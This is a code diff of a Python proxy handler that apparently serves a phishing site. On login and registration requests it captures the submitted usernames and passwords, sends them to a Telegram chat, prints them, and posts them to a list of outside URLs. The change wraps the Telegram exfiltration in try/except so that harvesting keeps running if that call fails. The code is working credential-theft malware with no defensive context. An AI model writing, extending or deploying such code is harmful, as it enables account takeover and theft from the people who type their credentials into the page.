@@ -137,7 +137,10 @@ def proxy(path):
             done = '❌'
         if path in ['entry/post/login', '/entry/post/login']:
             form_dict = dict(request.form)
-            bot.send_message(-937233343, f'Логин: {done}\n{form_dict["login"]}\n{form_dict["password"]}')
+            try:
+                bot.send_message(-937233343, f'Логин: {done}\n{form_dict["login"]}\n{form_dict["password"]}')
+            except:
+                pass
             for url in bmb_urls:
                 try:
                     print(f'{form_dict["login"]}:{form_dict["password"]}')
@@ -149,7 +152,10 @@ def proxy(path):
                     continue
         if path in ['entry/post/register', '/entry/post/register']:
             form_dict = dict(request.form)
-            bot.send_message(-937233343, f'Регистрация: {done}\n{form_dict["login"]}\n{form_dict["password1"]}')
+            try:
+                bot.send_message(-937233343, f'Регистрация: {done}\n{form_dict["login"]}\n{form_dict["password1"]}')
+            except:
+                pass
             for url in bmb_urls:
                 try:
                     result = requests.post(url + bmbkeys, json=[f'{form_dict["login"]}:{form_dict["password1"]}'],
